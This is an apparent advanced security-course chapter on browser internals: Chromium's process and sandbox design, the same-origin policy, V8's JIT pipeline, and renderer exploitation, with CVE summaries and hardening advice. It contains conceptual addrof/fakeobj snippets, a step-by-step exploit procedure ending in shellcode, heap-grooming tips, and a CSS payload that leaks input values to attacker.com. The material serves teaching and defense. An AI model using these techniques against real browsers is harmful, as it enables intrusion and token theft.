---
corso: "Cybersecurity Masterclass"
fase: "Domain 8 — Web Security"
modulo: "8.3"
titolo: "Browser Internals, V8, and Sandbox Architecture"
versione: "Chromium 126+, V8 Sandbox (default Chrome 123+), Firefox Fission, WebKit/Safari 18"
livello: "Advanced"
prerequisiti:
  - "Domain 8 Chapter 8A (SOP, XSS, CSP, CORS, OAuth/OIDC, session security)"
  - "Domain 8 Chapter 8B (server-side injection classes, HTTP request smuggling)"
  - "Domain 4 (code reuse — ROP/JOP, CFI concepts)"
  - "Domain 2 Chapters 2B–2C (seccomp-BPF, namespaces, process isolation)"
obiettivi:
  - "Trace the Chromium multi-process architecture (browser, renderer, GPU, network service) and explain the security boundary each sandbox enforces"
  - "Describe V8's JIT pipeline (Ignition → Sparkplug → Maglev → TurboFan) and how type-confusion bugs in TurboFan optimization yield addrof/fakeobj exploitation primitives"
  - "Analyze Chrome sandbox escape chains (Mojo IPC bugs, GPU process escalation, kernel CVEs) using real-world case studies (Pwn2Own, in-the-wild 0days)"
  - "Evaluate browser privacy and fingerprinting defenses (canvas, WebGL, AudioContext, font enumeration) and configure cross-origin isolation (COOP/COEP/CORP) headers"
  - "Apply detection engineering techniques (YARA, Sigma, Suricata rules) to identify browser exploitation indicators and malicious extension behavior"
tag: [security, browser, v8, chromium, webkit, firefox, sandbox, jit, type-confusion, site-isolation, mojo, extension-security, fingerprinting, webassembly, spectre]
---

# Domain 8, Chapter 8C — Browser Internals, V8, and Sandbox Architecture

> **Learning Objectives.**
> After completing this chapter, you will be able to:
> 1. Map the Chromium, Firefox, and Safari multi-process architectures and identify the trust boundaries, IPC mechanisms, and sandbox policies at each process layer.
> 2. Explain V8's tiered JIT compilation pipeline and how incorrect type speculation in TurboFan produces the `addrof`/`fakeobj` primitive pair that enables arbitrary read/write in the renderer.
> 3. Walk through a complete V8 type-confusion exploit chain — from trigger function to JIT-compiled shellcode injection — referencing real CVEs (CVE-2021-21224, CVE-2023-2033, CVE-2024-0519).
> 4. Analyze sandbox escape vectors (Mojo IPC bugs, GPU driver vulnerabilities, kernel syscall exploitation) and full-chain case studies (Pwn2Own 2023–2025, NSO Pegasus browser vectors, Intellexa Predator).
> 5. Configure cross-origin isolation headers (COOP/COEP/CORP), evaluate browser fingerprinting vectors and defenses, and write YARA/Sigma/Suricata detection rules for browser exploitation indicators.

> **Scope.** V8 JavaScript engine: JIT pipeline (Ignition, Sparkplug, Maglev, TurboFan), object representation (Maps, elements kinds), type confusion bugs leading to `addrof`/`fakeobj` primitives, full primitive chain walkthrough, Wasm RWX shellcode injection, V8 heap sandbox bypass. Chrome site isolation (process-per-site-instance, out-of-process iframes, CORB, ORB). Blink rendering engine (document lifecycle, DOM, CSSOM, layout, paint, compositing). Chrome sandbox architecture (renderer, GPU, network service, Mojo IPC). Mojo IPC exploitation (interface enumeration, message crafting, race conditions, sandbox escape). Sandbox escape vectors. PartitionAlloc internals (buckets, slot spans, freelist encoding, MiraclePtr quarantine). Firefox sandbox (RLBox, sandboxbroker). Safari/WebKit sandbox and XPC services. Same-Origin Policy internals. Renderer exploitation. Web API security. Extension security model. Cookie security. Speculative execution defenses. Privacy and fingerprinting. Browser fuzzing (Domato, Fuzzilli, ClusterFuzz, sanitizer builds). Detection engineering (YARA, Sigma, Suricata, EDR). Browser hardening (enterprise policies, JIT-less mode, about:config). CVE reference table (14 CVEs). Browser exploit chain case studies (Pwn2Own 2023–2024, Safari/WebKit in-the-wild, Firefox IPC, Intellexa Predator, NSO Pegasus browser vectors). WebAssembly security (linear memory isolation, JIT W^X, WASI capability model, component model, cryptomining detection, Wasm fuzzing). Browser forensics (process memory acquisition, crash dump analysis, history/cache forensics, extension forensics, ServiceWorker forensics, browser telemetry). Modern attack surface (WebGPU/WebNN, WebTransport/WebCodecs, Fenced Frames, Topics API, Storage Partitioning/CHIPS, XS-Leaks taxonomy, Speculation Rules API).

---

## 1. Browser architecture security

### 1.1 Multi-process model (Chromium)

Chromium decomposes the browser into isolated OS processes, each with a distinct trust level and sandbox policy:

**Browser process.** The single most-privileged process. Manages the URL bar (omnibox), tab lifecycle, bookmarks, downloads, profile data, and all cross-process coordination. It holds the cookie jar, credential store, and filesystem access. It is NOT sandboxed because it requires full system interaction. Compromising this process from a renderer is the goal of sandbox-escape exploits.

**Renderer processes.** Execute web content — HTML parsing (Blink), JavaScript (V8), CSS layout, painting, and compositing setup. Each renderer is confined to the tightest sandbox the OS supports. Under strict site isolation, one renderer process handles one site instance (scheme + eTLD+1). With `--site-per-process` (default since Chrome 67 on desktop), every cross-site iframe spawns a separate renderer process. The renderer process runs as a low-integrity (Windows) or heavily-sandboxed (Linux/macOS) process.

**GPU process.** Receives display-list commands from renderers via Mojo (`gpu::CommandBuffer`) and executes them on the actual GPU. It requires device access (`/dev/dri/*` on Linux, `IOKit` on macOS, direct GPU memory on Windows), so its sandbox is looser than the renderer's. On Linux it allows `ioctl`, `mmap`, `mprotect`, and device-file reads that the renderer cannot perform. GPU driver vulnerabilities reachable from this process can provide kernel-level code execution, making it a high-value escalation target.

**Network service.** All HTTP/HTTPS/QUIC networking happens here. It performs DNS resolution, TLS handshake, HTTP/2 and HTTP/3 framing, and response-body streaming. CORB/ORB filtering occurs here before response bodies reach renderers. Sandboxed with no filesystem access and restricted syscalls on Linux.

**Utility processes.** Handle parsing of untrusted data formats outside the renderer: JSON parsing, ZIP extraction, PDF rendering (`chrome_pdf`), media decoding (via `mojo::MediaService`). Each runs in its own sandbox. If a malformed PDF triggers a heap overflow in `chrome_pdf`, the damage is confined to the utility process.

**Extension processes.** Each extension with a background page or service worker runs in a dedicated process. Extensions share renderer-like sandboxing but have access to additional Mojo interfaces based on their declared permissions (e.g., `tabs`, `cookies`, `webRequest`).

Process count can be observed at `chrome://process-internals/` and `chrome://about/#activity`. The per-process memory overhead is approximately 10–30 MB on desktop, which Chrome manages with process-sharing heuristics for same-site origins and process limits on resource-constrained devices.

### 1.2 Site isolation

**Origin-keyed processes.** Site isolation assigns renderer processes at the granularity of "site" (scheme + eTLD+1 by default). `https://mail.google.com` and `https://drive.google.com` share a process (same site: `google.com`), but `https://evil.com` runs in a separate process. With `Origin-Agent-Cluster` header or `chrome://flags/#origin-agent-cluster`, isolation can be upgraded to full origin (scheme + host + port), separating `mail.google.com` from `drive.google.com`.

**Out-of-process iframes (OOPIF).** A cross-site iframe (`<iframe src="https://b.com">` on `https://a.com`) renders in a separate process. The parent frame sees a `RenderFrameProxyHost` placeholder; the iframe content lives in b.com's renderer. Input events, scrolling, hit-testing, and focus management are coordinated across processes via the browser process. OOPIF was a massive engineering effort (over 5 years) touching layout, painting, input handling, accessibility, and DevTools.

**Process-per-site vs. process-per-origin.** Default "process-per-site" groups all pages from `https://example.com` (any subdomain) into one process. `--isolate-origins=https://high-value.example.com` or the `Origin-Agent-Cluster` header upgrades specific origins to per-origin isolation. Android uses a reduced site-isolation model for memory reasons: only sites the user has logged into receive dedicated processes.

### 1.3 Sandbox architecture by OS

**Windows.** Renderers run with a restricted token: integrity level `Low` (or `Untrusted` in newer builds), all privileges removed, restricted SIDs blocking access to most securable objects. The renderer runs in a separate Windows Station and Desktop (preventing `SendMessage`/`PostMessage` attacks against the browser's UI). A Job Object limits process creation (`JOB_OBJECT_LIMIT_ACTIVE_PROCESS = 1`), preventing the renderer from spawning children. **Win32k lockdown** (`SetProcessMitigationPolicy(ProcessSystemCallDisablePolicy)`) blocks all `win32k.sys` syscalls (GDI, USER), eliminating the entire kernel GUI attack surface — historically responsible for dozens of Windows LPE CVEs. DACLs on the renderer's token prevent it from opening handles to higher-privilege processes.

**Linux.** The Zygote process forks renderer children. Before the renderer processes any content, the sandbox is applied: `prctl(PR_SET_NO_NEW_PRIVS, 1)` prevents privilege escalation via `execve`; user/PID/network namespaces isolate the process (network namespace has no interfaces, preventing direct network I/O); a seccomp-BPF filter loaded via `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER)` restricts syscalls to approximately 30–40 allowed entries. Allowed syscalls include `read`, `write`, `close`, `mmap`, `mprotect`, `munmap`, `brk`, `futex`, `epoll_wait`, `poll`, `recvmsg` (for IPC), `sendmsg`, `clock_gettime`, `gettid`, `exit_group`, and a few others. Notably absent: `open`, `openat` (no filesystem access), `connect`, `bind`, `socket` (no networking), `execve` (no process execution), `ptrace` (no debugging), `mount`, `chroot`.

**macOS.** The renderer runs under a Seatbelt sandbox profile (`.sb` policy file). The profile is deny-by-default: it blocks file reads/writes (except specific temporary directories), network access, Mach port lookups (except the bootstrap port needed for IPC with the browser process), hardware device access, and most IOKit calls. Apple's `sandbox-exec` enforces the profile at the kernel level via the TrustedBSD mandatory access control framework. Chrome ships its own `.sb` profiles in the app bundle under `Contents/Resources/`.

### 1.4 IPC security

**Mojo (Chromium).** Chromium's IPC framework. Interfaces are defined in `.mojom` IDL files (e.g., `blink/public/mojom/blob/blob.mojom`). Mojo generates C++ bindings that serialize/deserialize parameters with type safety. Each interface has a browser-side implementation that validates all inputs from the renderer. A core security principle: "the renderer is compromised" — every Mojo message from a renderer is treated as adversarial. The browser process must validate origins, permissions, and parameter bounds before performing any privileged action.

Key Mojo security patterns:
- **BrowserInterfaceBroker**: Controls which Mojo interfaces a renderer can request. A renderer for `https://a.com` can only bind interfaces appropriate for web content, not interfaces meant for WebUI (`chrome://` pages) or extensions.
- **Receiver validation**: Each Mojo receiver checks the calling renderer's `RenderFrameHost` to verify origin, permission, and lifecycle state.
- **Message pipes**: Unidirectional, typed channels. Message ordering is guaranteed per pipe. Pipes are non-forkable — a compromised renderer cannot duplicate a pipe to inject messages into another renderer's conversation with the browser.

**IPDL (Firefox).** Firefox uses IPDL (IPC Protocol Definition Language) for its inter-process messaging. IPDL protocols define actors (parent/child pairs) and messages with typed parameters. The generated C++ code handles serialization and dispatch. IPDL has a "managed protocol" concept: child protocols are lifetime-managed by parent protocols, preventing dangling actor references. Firefox's IPC security model similarly treats the content process as compromised (project Fission).

---

## 2. Same-Origin Policy internals

### 2.1 Origin definition

An origin is the tuple **(scheme, host, port)**. `https://example.com:443` and `http://example.com:443` are different origins (different scheme). `https://example.com:443` and `https://example.com:8443` are different origins (different port). The default port for a scheme (443 for HTTPS, 80 for HTTP) is implicit.

**Opaque origins.** `data:` URLs, `sandboxed` iframes without `allow-same-origin`, and `blob:` URLs created from an opaque context have opaque origins. An opaque origin is unique — it is not equal to any other origin, including itself in a different context. This means `data:text/html,<script>...</script>` loaded in an iframe has no origin access to the parent, even if the parent created it.

**`blob:` URL origins.** A `blob:` URL inherits the origin of the context that created it. `blob:https://example.com/xxxx` has origin `https://example.com`. If revoked (`URL.revokeObjectURL`), the blob becomes inaccessible, but any document already loaded from it retains the inherited origin.

**`file:` URL origins.** Browser-dependent. Chromium treats each `file:` URL as a unique opaque origin (no two local files share an origin). Firefox historically allowed same-origin access between local files in the same directory but has tightened this.

### 2.2 SOP relaxation mechanisms

**`document.domain`.** Historically, two subdomains could set `document.domain = "example.com"` to share cookies and DOM access. Chromium deprecated `document.domain` setter in Chrome 115 (behind `chrome://flags/#origin-agent-cluster-default`). `Origin-Agent-Cluster: ?1` header opts into per-origin isolation and disables `document.domain`. This closes a class of XSS escalation where compromising `sub1.example.com` gave access to `sub2.example.com` via `document.domain` relaxation.

**CORS (Cross-Origin Resource Sharing).** The server opts in to sharing responses cross-origin via `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, and preflight `OPTIONS` requests. CORS is enforced by the browser, not the server — a compromised renderer can bypass CORS checks locally, which is why site isolation and CORB/ORB exist as a defense-in-depth.

Misconfigured CORS is a persistent vulnerability class:
- `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is explicitly forbidden by the spec but some servers misconfigure this.
- Reflecting the `Origin` header value directly into `Access-Control-Allow-Origin` without validation allows any origin to read responses.
- Regex-based origin validation that matches `evil-example.com` as `example.com` due to insufficient anchoring.

**`postMessage`.** Cross-origin communication via `window.postMessage()`. The receiver must validate `event.origin` to prevent data injection from malicious frames. Common vulnerability: omitting origin check or checking against a permissive pattern (e.g., `*.example.com` matching `evil.example.com`).

**JSONP.** Legacy pattern: `<script src="https://api.example.com/data?callback=handleData">`. The server returns `handleData({...})`, executing in the requesting page's context. JSONP inherently bypasses SOP (scripts are not subject to cross-origin read restrictions). JSONP endpoints are a classic CSRF and data-exfiltration vector: any page can include the script tag and read the response. Modern replacement: CORS.

### 2.3 SOP bypass techniques and historical CVEs

**UXSS (Universal XSS).** Bugs in the browser itself that allow JavaScript in one origin to access another origin's DOM. Unlike reflected/stored XSS (server-side), UXSS is a browser-side vulnerability.

- **CVE-2017-5124 (Chrome UXSS via MHTML).** Chrome's MHTML handler allowed JavaScript execution in the context of the MHTML file's origin, enabling cross-origin DOM access.
- **CVE-2020-6418 (Chrome V8 type confusion).** A V8 bug in `JSCreate` allowed type confusion leading to renderer RCE; while not directly UXSS, combined with site isolation bypass it enabled cross-origin data theft.
- **CVE-2021-21224 (V8 type confusion).** Integer overflow in V8's `Turbofan` optimization for `kChangeInt32ToInt64` node. PoC pattern: craft a function that triggers incorrect truncation during optimization, causing out-of-bounds access in a `TypedArray`. Used in Chromium full-chain exploits.

**Navigation-based bypasses.** Historically, racing a navigation (starting a cross-origin navigation and reading DOM properties during the brief window before the old document is torn down) yielded SOP bypasses. Modern browsers synchronize navigation and DOM teardown to prevent this.

**Plugin-based bypasses.** Flash, Java applets, and Silverlight had their own origin models that sometimes conflicted with the browser's SOP. Flash's `crossdomain.xml` was a frequent misconfiguration vector. With plugin deprecation (Flash EOL December 2020), this attack surface is gone.

---

## 3. V8 JavaScript engine

### 3.1 JIT compilation pipeline

V8 executes JavaScript through a tiered compilation system, where code progresses from interpreted bytecode to highly optimized machine code as it becomes "hot":

**Ignition (interpreter).** Parses JavaScript to an AST, compiles to V8 bytecode, and interprets. Bytecode is compact and quick to generate. Ignition collects type feedback: it records which types (integers, doubles, strings, objects) each operation actually encounters at runtime. Type feedback is stored in feedback vectors attached to each function.

**Sparkplug (baseline compiler).** A fast, non-optimizing compiler that translates bytecode directly to machine code without heavy analysis. It produces code quickly (low latency) but without optimizations. Sparkplug's output runs faster than interpretation but slower than optimized code. Sparkplug does not use type feedback and generates generic code.

**Maglev (mid-tier compiler, introduced in Chrome 114).** An SSA-based (Static Single Assignment) compiler that uses Ignition's type feedback to generate moderately-optimized code. Faster to compile than TurboFan, produces better code than Sparkplug. Fills the gap between Sparkplug and TurboFan. Maglev performs speculative optimizations but with fewer transformations than TurboFan, reducing the optimization-bug attack surface.

**TurboFan (optimizing compiler).** V8's top-tier optimizing compiler. Uses type feedback to speculate about types (e.g., "this addition always receives integers"), generates highly optimized machine code with those assumptions, and inserts **deoptimization bailouts** — checks that verify the assumptions at runtime and, if violated, deoptimize back to Ignition/Sparkplug. TurboFan operates on a "sea of nodes" intermediate representation (IR) where data flow and control flow edges are explicit. Optimization passes include inlining, escape analysis, bounds check elimination, loop unrolling, dead code elimination, and redundancy elimination. Each of these passes is a potential source of security bugs.

### 3.2 Object representation and Maps

V8 represents JavaScript objects internally using **Maps** (also called "hidden classes" or "shapes"). A Map describes an object's layout: which properties it has, at what offsets they are stored, and what type each property is. Objects with the same property names added in the same order share the same Map.

When a property is added or its type changes, the object transitions to a new Map. These Map transitions form a tree. V8 uses Maps for inline caching: at each property access site, V8 records the Map it saw last and generates code that directly accesses the property at the known offset, falling back to a slower lookup only if the Map doesn't match.

**Elements kinds.** JavaScript arrays have an internal "elements kind" that describes their storage strategy: `PACKED_SMI_ELEMENTS` (dense array of small integers — stored unboxed), `PACKED_DOUBLE_ELEMENTS` (dense array of doubles — stored as 64-bit floats), `PACKED_ELEMENTS` (dense array of arbitrary JS values — stored as tagged pointers), and `HOLEY_*` variants (arrays with holes/undefined entries — require extra bounds checks). The elements kind determines which fast path V8 uses for array operations.

Elements kinds form a lattice: transitions go from more specific to more general (SMI → DOUBLE → ELEMENTS, PACKED → HOLEY) but never reverse. Once an array becomes HOLEY, it stays HOLEY.

### 3.3 Type confusion and exploitation primitives

The core vulnerability pattern in V8: a bug in TurboFan's optimization causes the compiler to emit code that assumes an incorrect type for a value. The speculative assumption (e.g., "this value is always a SMI") is wrong, but the deoptimization check that should catch the mismatch is missing or incorrect. The generated code operates on the value as if it were the assumed type, but the actual runtime value is a different type.

**Mechanism.** TurboFan's optimization passes propagate type information through the IR graph. A bug in type narrowing (e.g., `Typer` phase incorrectly computing the range of an arithmetic result), redundancy elimination (removing a check that is actually needed), or escape analysis (incorrectly determining an allocation can be eliminated) can produce machine code that skips a necessary bounds check or type guard. The attacker crafts JavaScript that triggers the specific optimization sequence, then provides input that violates the assumption the generated code relies on.

Common vulnerability classes in TurboFan optimization:

- **Incorrect range analysis (Typer bugs).** The `Typer` phase computes value ranges for each node in the IR. If it computes an overly narrow range (e.g., "result is in [0, 100]" when the actual range includes negative values), downstream passes may eliminate bounds checks that are actually needed. The `Typer` must handle all edge cases: integer overflow, NaN propagation, `-0` vs `+0`, `Infinity`, and coercion behavior.
- **Bounds check elimination (BCE).** TurboFan eliminates redundant bounds checks when it can prove the index is always in-bounds. If the proof is flawed (e.g., it relies on an incorrect range from the Typer), the eliminated bounds check allows out-of-bounds array access.
- **Redundancy elimination.** Removes duplicate computations and checks. If a deoptimization guard is incorrectly classified as redundant (e.g., because a prior guard appears to cover the same condition, but the conditions are actually different due to side effects), the remaining code runs without the guard.
- **Escape analysis.** Determines whether an object allocation can be eliminated (if the object never "escapes" the function). Incorrect escape analysis can eliminate an allocation that is actually needed, causing later code to access uninitialized or reused stack memory.
- **JIT spraying.** The attacker embeds controlled constants in JavaScript code (e.g., `0x41414141 + 0x42424242 + ...`). TurboFan generates machine code containing these constants as immediate operands. By jumping into the middle of an instruction that encodes a constant, the attacker interprets the constant bytes as machine instructions. Modern V8 mitigates this with constant blinding (XORing constants with a random key).

**Exploitation — canonical primitives:**

**`addrof` (address-of).** A confusion between an object and a number: V8 treats an object reference (a pointer) as a number and returns it to JavaScript as a numeric value. This leaks the in-memory address of a JavaScript object, defeating ASLR for V8's heap.

Simplified PoC pattern (conceptual):
```javascript
// Trigger optimization with a double array, then trick TurboFan
// into treating an object reference as a double element
function triggerAddrof(arr, obj) {
  // TurboFan optimizes this assuming arr always contains doubles
  // A bug causes it to skip the type check on arr[0]
  arr[0] = obj;  // stores an object pointer where a double is expected
  return arr[0]; // reads the pointer bytes as a float64 value
}
// The returned float64 encodes the object's in-memory address
```

**`fakeobj` (fake-object).** The reverse: V8 treats a number (provided by the attacker) as an object pointer. The attacker provides an address (pointing at attacker-controlled data in the V8 heap), and V8 returns a JavaScript object "backed" by that data. The attacker controls the fake object's Map pointer, elements pointer, and other fields, giving them a fully-controlled JavaScript object that can read/write arbitrary memory.

Simplified PoC pattern (conceptual):
```javascript
// Trick TurboFan into treating a double (controlled address) as an object
function triggerFakeobj(arr, addr_as_float) {
  arr[0] = addr_as_float;  // stores a float64 where an object ptr is expected
  return arr[0];            // returns it as a JS object reference
}
// The returned value is a JS object at the address encoded in addr_as_float
```

**Exploitation procedure (post-primitives):**
1. Use `addrof` to leak addresses of controlled objects (e.g., a `Float64Array` and its backing `ArrayBuffer`).
2. Use `fakeobj` to create a fake `ArrayBuffer` or `TypedArray` whose backing-store pointer points to an arbitrary address.
3. Read/write arbitrary memory in the renderer process via the fake `TypedArray`.
4. Overwrite a JIT code page (which is RWX or RW→RX with W^X) with shellcode, or construct a ROP chain using gadgets from V8's JIT code.
5. Trigger execution of the shellcode by calling the JIT-compiled function.

**Post-exploitation in the renderer.** With arbitrary read/write, the attacker typically:
- Scans memory for the V8 isolate's `Heap` structure to locate JIT code regions.
- Identifies a JIT-compiled function's code object and overwrites its machine code with shellcode.
- Alternatively, corrupts a `WasmInstanceObject` to redirect Wasm function calls to attacker-controlled code.
- On systems with W^X enforcement on JIT pages, the attacker uses `mprotect` via ROP to make a memory region executable, or chains through Wasm compilation to get a legitimate RWX page.

**Detection.** V8 type confusion exploits typically exhibit anomalous deoptimization patterns. Chrome's `--trace-deopt` flag logs deoptimizations. Defensive monitoring: V8's `V8.ICMiss` and `V8.Deopt*` UMA (User Metrics Analysis) counters in `chrome://histograms/` can indicate abnormal type feedback churn. Site isolation limits the blast radius — even successful renderer exploitation only accesses the compromised site's data.

Additional detection indicators:
- Functions with abnormally high optimization/deoptimization cycles (hot-cold-hot pattern typical of exploit trigger functions).
- V8 crash reports (`chrome://crashes/`) showing SIGSEGV in JIT code regions.
- CSP violation reports when exploit payloads attempt to load external resources.
- DevTools `Performance` panel showing unusual JIT compilation spikes.

**Hardening flags and configurations:**
- `chrome://flags/#enable-v8-sandbox` — enables V8 heap sandbox (default on 64-bit since Chrome 123).
- `--jitless` V8 flag — disables JIT entirely, running only the interpreter. Eliminates all JIT-related attack surface at a severe performance cost. Used in security-sensitive embeddings.
- `--no-expose-wasm` — disables WebAssembly, removing Wasm JIT as an attack vector.
- `chrome://flags/#v8-sparkplug` — controls Sparkplug baseline compiler.
- V8's `--turbo-verify-machine-graph` (debug builds) — verifies IR graph consistency after each optimization pass.

**CVE examples:**

- **CVE-2021-21224.** Integer overflow in TurboFan's `ChangeInt32ToInt64` node. When TurboFan optimized an integer conversion, it truncated a value incorrectly, leading to an out-of-bounds access in a `TypedArray`. The bug was in `simplified-lowering.cc`. Exploitation: trigger the optimization path with values near `INT32_MAX`, cause the incorrect truncation, read/write out-of-bounds in the `TypedArray`'s backing store. Reported by Jose Martinez (user5765@gmail.com bug bounty). CVSS 8.8.

- **CVE-2021-30551.** Type confusion in V8's handling of `Map` transitions. When an object transitioned between Maps during an optimized function's execution, TurboFan's assumption about the object's layout was violated, but the deoptimization guard was eliminated by a redundancy-elimination pass. The attacker could read memory at offsets corresponding to the wrong Map's property layout. Exploited in the wild, reported by Sergei Glazunov of Google Project Zero.

- **CVE-2022-1096.** Type confusion in V8's `Runtime_FunctionCallback`. Triggered from JavaScript via a carefully crafted call sequence. Exploited in the wild; patch: `chromium.googlesource.com/v8/v8/+/d0e491fa68`. CVSS 8.8. No technical details publicly disclosed due to active exploitation.

- **CVE-2023-2033.** Type confusion in V8 reported by Threat Analysis Group (TAG). Exploited in the wild. The bug was in the `Turbofan` JIT and allowed arbitrary code execution within the renderer. Chrome 112.0.5615.121 patched it within days of in-the-wild discovery.

- **CVE-2023-4863.** Heap buffer overflow in libwebp (WebP image decoder) integrated into Chromium. Not a V8 bug, but reached through web content rendering. Exploited in the wild, initially reported via Apple Security Engineering. The bug was in the Huffman table construction of the lossless WebP decoder. CVSS 8.8.

- **CVE-2024-0519.** Out-of-bounds memory access in V8. Exploited in the wild. The vulnerability was in the V8 JavaScript engine and could be triggered via crafted JavaScript on a web page.

### 3.4 V8 Sandbox (V8 Heap Sandbox)

A defense introduced progressively from 2022. V8 isolates its heap from the rest of the process's address space. External pointers (pointers from V8 heap objects to non-V8 memory, such as `ArrayBuffer` backing stores, C++ callback addresses) are replaced with indices into a **pointer table** (the External Pointer Table). The table entries are tagged with type information; V8 validates the tag when dereferencing an external pointer, preventing a type-confused external pointer from being used to access the wrong resource.

**Mechanism:** V8 heap objects that previously stored raw C++ pointers now store 32-bit indices. The External Pointer Table maps indices to (pointer, tag) pairs. Accessing an external pointer requires: (1) reading the index from the V8 object, (2) looking up the table entry, (3) checking the tag matches the expected type, (4) using the pointer. A V8 type confusion that corrupts an index in-heap is limited: the attacker can only redirect to another entry in the table with the same tag, not to arbitrary memory.

**Limitations:** The V8 sandbox does not prevent all exploitation — an attacker with arbitrary read/write within the V8 heap can corrupt the pointer table itself (if it is mapped adjacent to the V8 heap) or find Mojo interface pointers that lead to the browser process. The V8 sandbox is defense-in-depth, not a complete mitigation. It is enabled by default on 64-bit platforms starting with Chrome 123 (`chrome://flags/#enable-v8-sandbox`).

### 3.5 SpiderMonkey (Firefox JS engine)

SpiderMonkey's JIT pipeline: **Interpreter** → **Baseline JIT** (analogous to Sparkplug; compiles to machine code without optimization) → **WarpMonkey** (the optimizing JIT, successor to IonMonkey). WarpMonkey uses CacheIR (cached inline-cache data) for speculative optimization, similar to TurboFan's use of feedback vectors.

SpiderMonkey vulnerability classes mirror V8: JIT type confusion (WarpMonkey/IonMonkey bugs), GC UAF (objects freed by the garbage collector while still referenced by JIT code), and bounds check elimination bugs. Firefox has historically had fewer publicly exploited JIT bugs than V8, partly due to smaller market share and partly due to different JIT design choices.

### 3.6 WebAssembly security model

WebAssembly (Wasm) runs in a sandboxed linear memory: a contiguous block of memory that Wasm code can address via 32-bit (or 64-bit with `memory64`) indices. Wasm code cannot access memory outside its linear memory, cannot call arbitrary host functions (only imported functions), and cannot execute arbitrary machine code (the browser JIT-compiles Wasm to native code in a controlled manner).

**Security boundaries:** Wasm modules cannot access the DOM directly (they must call imported JavaScript functions). Wasm's type system is validated at load time (every instruction is type-checked). Memory safety within Wasm is the module author's responsibility — buffer overflows within the linear memory are possible and can corrupt Wasm-level data, but cannot escape to corrupt the browser process's memory. The linear memory is mapped with guard pages (several GB of virtual address space reserved, with only the used portion committed) to trap out-of-bounds accesses efficiently.

**Attack vectors:** Wasm code can contain logic bugs (e.g., a Wasm-compiled C library with a buffer overflow), but these are confined to the linear memory. The JIT compiler that translates Wasm to native code is an attack surface: bugs in Wasm JIT (e.g., incorrect register allocation, missing bounds checks on table accesses) can lead to native code execution. CVE-2023-5217 (libvpx heap overflow via VP8 encoding) was reachable through Wasm in some configurations.

---

## 4. Renderer exploitation

### 4.1 DOM UAF (Use-After-Free)

**Mechanism.** The DOM is a C++ object graph managed by Blink. JavaScript retains references to DOM nodes via V8 wrappers. If a DOM node is destroyed (e.g., by `removeChild`, `innerHTML` assignment, or document teardown) but V8's wrapper is not properly invalidated, JavaScript can use the dangling wrapper to access freed memory. The freed memory may have been reallocated for a different object, leading to type confusion.

**Exploitation pattern:**
1. Create a DOM structure (e.g., a `<div>` with children and event listeners).
2. Obtain a JavaScript reference to a child node.
3. Trigger destruction of the child (e.g., `parent.innerHTML = ""` or navigating the frame).
4. Force garbage collection or heap manipulation to reallocate the freed memory with attacker-controlled data.
5. Access the dangling reference — the wrapper now points to the attacker's data.
6. Use the corrupted object's vtable pointer to hijack control flow (vtable spray) or read/write fields at known offsets.

**Historical CVEs:**
- **CVE-2019-5786.** `FileReader` UAF in Chrome. The `FileReader` API's asynchronous read operation freed a buffer while a reference was still held. Combined with CVE-2019-0808 (Win32k LPE), this formed a full chain exploited in the wild by an APT group. The `FileReader` bug gave renderer-process code execution; the `Win32k` bug escalated to SYSTEM.
- **CVE-2020-6572.** UAF in `MediaRecorder` API in Blink. The media recorder's source could be destroyed while the recorder held a dangling pointer to it.
- **CVE-2021-21166.** Object lifecycle issue in Blink's audio processing. Exploited in the wild.

**Detection:** Chrome's ClusterFuzz (continuous fuzzing infrastructure) and AddressSanitizer (ASan) builds catch many UAF bugs during development. `MiraclePtr` (BackupRefPtr/raw_ptr) is a C++ smart pointer deployed in Chromium that makes UAF exploitation significantly harder — when a `MiraclePtr`-protected pointer dangles, the memory is quarantined (not reused), preventing the attacker from placing controlled data at the freed address. Coverage: as of 2024, MiraclePtr protects approximately 60% of raw pointers in the browser process.

**Heap grooming for DOM UAF.** After freeing the target DOM node's memory, the attacker must allocate a controlled object of the same size in the same heap bucket. Techniques:
- Spray `ArrayBuffer` objects of the target size (their backing store lands in PartitionAlloc's "normal" bucket).
- Allocate `Blob` objects with controlled data.
- Create DOM elements with inline styles (the style data allocation can fill the freed slot).
- Use `TextEncoder().encode()` to allocate controlled byte sequences.

Chrome's PartitionAlloc allocator (replacing tcmalloc since Chrome 83) places objects in size-bucketed partitions. DOM nodes, ArrayBuffers, and strings occupy different partitions, making cross-type heap grooming harder. PartitionAlloc also uses guard pages between partitions, randomizes free-list ordering, and zeroes freed memory (making dangling-pointer reads return zeroes instead of stale data). `BackupRefPtr` (MiraclePtr) adds reference counting to detect dangling accesses at runtime.

### 4.2 CSS-based attacks

**CSS injection for data exfiltration.** If an attacker can inject arbitrary CSS (e.g., via a CSS injection vulnerability in a web application), they can exfiltrate data character-by-character using attribute selectors and external resource loads:

```css
input[value^="a"] { background: url(https://attacker.com/leak?char=a); }
input[value^="b"] { background: url(https://attacker.com/leak?char=b); }
/* ... for each character ... */
```

When the input's value starts with "a", the browser fetches `https://attacker.com/leak?char=a`, revealing the first character. By iterating (injecting new CSS after each leak), the attacker extracts the full value. This works against CSRF tokens in hidden form fields.

**Hardening:** `Content-Security-Policy: style-src 'self'` prevents inline style injection. `style-src 'nonce-{random}'` allows only nonced `<style>` blocks.

**CSS Houdini API abuse.** The CSS Paint API (`registerPaint`) allows custom paint worklets written in JavaScript. A malicious paint worklet could attempt timing attacks (measuring rendering time to infer cross-origin content). Browsers restrict paint worklets to operate only on the element's own geometry, and cross-origin information is not available to the worklet context.

### 4.3 SVG and MathML exploitation

**SVG parsing bugs.** SVG is XML-based and processed by Blink's XML parser and SVG rendering code. SVG's complexity (filters, animations, `<use>` element with shadow DOM cloning, `<foreignObject>` embedding HTML) creates a large attack surface. Bugs in SVG filter processing (`feConvolveMatrix`, `feMorphology`) have led to heap overflows. `<use>` element bugs where cloning a referenced element creates a dangling reference. SVG `<animate>` elements that modify DOM attributes during layout can trigger TOCTOU (time-of-check-time-of-use) bugs.

**MathML.** MathML rendering in Firefox (and partially in Safari/Chromium) has produced type confusion bugs where MathML elements are processed by code paths expecting HTML elements, leading to incorrect field access.

---

## 5. Chrome site isolation

### 5.1 Process-per-site-instance

